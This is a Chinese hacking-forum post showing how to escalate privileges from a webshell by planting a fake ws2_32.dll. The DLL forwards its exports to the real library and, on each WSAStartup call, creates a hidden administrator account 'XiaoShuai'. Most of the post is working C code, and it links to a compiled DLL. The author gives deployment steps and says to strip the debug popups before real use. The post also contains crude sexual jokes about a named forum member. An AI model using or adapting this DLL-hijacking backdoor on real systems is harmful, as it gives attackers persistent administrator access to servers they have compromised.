@@ -1,0 +1,222 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+webshell提权利器—劫持系统函数执行任意代码 分析实现 -- 附件已修正
+D8888D主贴内容-------------------------------------------------------
+ 
+
+声明！本版本未经严格测试！仅是利用自己以前写的一个小破软件测试了一下！
+
+而且代码仅供参考！只要稍微有点C功底就可以给进一步完善下去！本帖只是启发思路。
+
+
+不好意思，代码放错了。已更正
+
+在水区看到了这个帖子，小帅黑客说他很有性趣。
+
+个人感觉提权用处不是很大，只是看起来比较猛而已。毕竟在Webshell下找一个可写的程序目录不是那么容易。而且对提权没太大的兴趣。
+
+不过小帅不停地：“我要！我要！”，还是给他写一个吧
+
+看名字就知道大概原理了，以前的木马有很多都是这个原理的。实际上这算是利用了windows寻找文件的一个特性，就是先在当前目录寻找需要调用的dll文件，如果没有找到那就再去系统目录下寻找，再没有就去环境变量中的目录中寻找。我们要做的就是伪造一个同名dll，并且伪造一张相同的输出表，伪造的DLL中把每个输出函数都跳转到真正的dll中。而在跳转之前我们就可以做爱做的事。
+
+OK了废话不多说，小帅非得让我给他写一个出来。好吧，来吧。
+
+因为C++多态，虚函数等特性。编译的时候输出函数的名字会被编译器改掉。所以要用 [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]1#pragma comment(linker, "/EXPORT:DestinyFunc=MyFunc,@1")
+来定义输出函数。
+
+毕竟那些输出函数都是假的，我们要转发，转发的话需要真实函数的地址。代码如下 [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]01        HMODULE m_hModule = NULL;        // 原始模块句柄 
+
+02        DWORD m_dwReturn[500] = {0};        // 原始函数返回地址 
+
+03  
+
+04  
+
+05        // 加载原始模块 
+
+06        inline BOOL WINAPI Load() 
+
+07        { 
+
+08                TCHAR tzPath[MAX_PATH]; 
+
+09                TCHAR tzTemp[MAX_PATH * 2]; 
+
+10  
+
+11                GetSystemDirectory(tzPath, MAX_PATH); 
+
+12                lstrcat(tzPath, TEXT("\\ws2_32.dll")); 
+
+13                m_hModule = LoadLibrary(tzPath); 
+
+14                if (m_hModule == NULL) 
+
+15                { 
+
+16                        wsprintf(tzTemp, TEXT("无法加载 %s，程序无法正常运行。"), tzPath); 
+
+17                        MessageBox(NULL, tzTemp, TEXT("AheadLib"), MB_ICONSTOP); 
+
+18                } 
+
+19  
+
+20                return (m_hModule != NULL);         
+
+21        } 
+
+22  
+
+23        // 释放原始模块 
+
+24        inline VOID WINAPI Free() 
+
+25        { 
+
+26                if (m_hModule) 
+
+27                { 
+
+28                        FreeLibrary(m_hModule); 
+
+29                } 
+
+30        } 
+
+31  
+
+32        // 获取原始函数地址 
+
+33        FARPROC WINAPI GetAddress(PCSTR pszProcName) 
+
+34        { 
+
+35                FARPROC fpAddress; 
+
+36                CHAR szProcName[16]; 
+
+37                TCHAR tzTemp[MAX_PATH]; 
+
+38  
+
+39                if (m_hModule == NULL) 
+
+40                { 
+
+41                        if (Load() == FALSE) 
+
+42                        { 
+
+43                                ExitProcess(-1); 
+
+44                        } 
+
+45                } 
+
+46  
+
+47                fpAddress = GetProcAddress(m_hModule, pszProcName); 
+
+48                if (fpAddress == NULL) 
+
+49                { 
+
+50                        if (HIWORD(pszProcName) == 0) 
+
+51                        { 
+
+52                                wsprintf(szProcName, "%d", pszProcName); 
+
+53                                pszProcName = szProcName; 
+
+54                        } 
+
+55  
+
+56                        wsprintf(tzTemp, TEXT("无法找到函数 %hs，程序无法正常运行。"), pszProcName); 
+
+57                        MessageBox(NULL, tzTemp, TEXT("AheadLib"), MB_ICONSTOP); 
+
+58                        ExitProcess(-2); 
+
+59                } 
+
+60  
+
+61                return fpAddress; 
+
+62        }
+OK了，可以找到真正的输出函数地址了，那就把每个输出函数都单列出来转到真正的输出函数就可以了，但是不能光转啊，光转的话怎么做爱做的事啊，我们在转发之前写一个邪恶的函数HiJackThis();
+
+我的HiJackThis是这么写的，仅供参考，大家可以自由发挥啊 [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]01void HiJackThis() 
+
+02{ 
+
+03        BOOL bIsXiaoShuaisAssholeReady; 
+
+04        STARTUPINFO si = {sizeof(si)}; 
+
+05        PROCESS_INFORMATION pi; 
+
+06        char* PutOffXiaoShuaisUnderwear = "net user XiaoShuai IsAHacker /add"; 
+
+07        char* StickIntoXiaoshuaisAsshole = "net localgroup administrators XiaoShuai /add"; 
+
+08        bIsXiaoShuaisAssholeReady = ::CreateProcess(NULL,PutOffXiaoShuaisUnderwear,NULL,NULL,FALSE,NULL,NULL,NULL,&si,&pi); 
+
+09        if (!bIsXiaoShuaisAssholeReady) 
+
+10        { 
+
+11                MessageBox(NULL,"fuck xiaoshuai failed","fuck",MB_ICONSTOP); 
+
+12        } 
+
+13        MessageBox(NULL,"OK,We'v put down Xiaoshuais underwear","YiKu",MB_OK); 
+
+14        CloseHandle(pi.hProcess); 
+
+15        bIsXiaoShuaisAssholeReady = ::CreateProcess(NULL,StickIntoXiaoshuaisAsshole,NULL,NULL,FALSE,NULL,NULL,NULL,&si,&pi); 
+
+16        if (!bIsXiaoShuaisAssholeReady) 
+
+17        { 
+
+18                MessageBox(NULL,"I can not stick into it","fuck",MB_ICONSTOP); 
+
+19        } 
+
+20        MessageBox(NULL,"OK,OK,We'v Fucked Xiaoshuai's Asshole","Yeah",MB_OK); 
+
+21        CloseHandle(pi.hProcess); 
+
+22}
+很简单，就不写注释了。只是启发思路用的。
+
+基本完活了，最后把每个输出函数都重写一下就OK了。在这里我用WSAStartup举例子，因为这个函数调用的很频繁，所以就搞他了。 [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]1ALCDECL AheadLib_WSAStartup(void) 
+
+2{ 
+
+3        HiJackThis(); 
+
+4        GetAddress("WSAStartup"); 
+
+5        __asm JMP EAX; 
+
+6}
+编译，完事。
+
+ [img]http://www.t00ls.net/images/attachicons/rar.gif[/img][url=http://www.t00ls.net/attachment.php?aid=OTA0MXw1NDgxZmE3OHwxMjg2NDc5MTA3fGQ4ZGIyWjBIRWtxSFAxTzNlUm83V3NlODlvT0JRTWN2QVV3TVZZTTBreDJlSDQw]链接标记AheadLib.rar[/url] (34.52 KB) 下载次数: 71
+
+2010-9-15 19:20
+这是一个很方便的小工具
+
+ [img]http://www.t00ls.net/images/attachicons/zip.gif[/img][url=http://www.t00ls.net/attachment.php?aid=OTA0MnwzZjE2NTA0NXwxMjg2NDc5MTA3fGQ4ZGIyWjBIRWtxSFAxTzNlUm83V3NlODlvT0JRTWN2QVV3TVZZTTBreDJlSDQw]链接标记ws2_32.zip[/url] (19.43 KB) 下载次数: 74
+
+2010-9-16 20:50
+完整的代码和编译的DLL。
+
+用的时候只要传到某个需要联网的软件目录下，然后静待软件重新运行，或者直接reboot服务器，就添加了一个用户名密码为XiaoShuai IsAHacker的管理员帐号。
+不过注意了。这个是POC版的，会出MessageBox的。稍微改下源码然后重新编一下就可以用了。
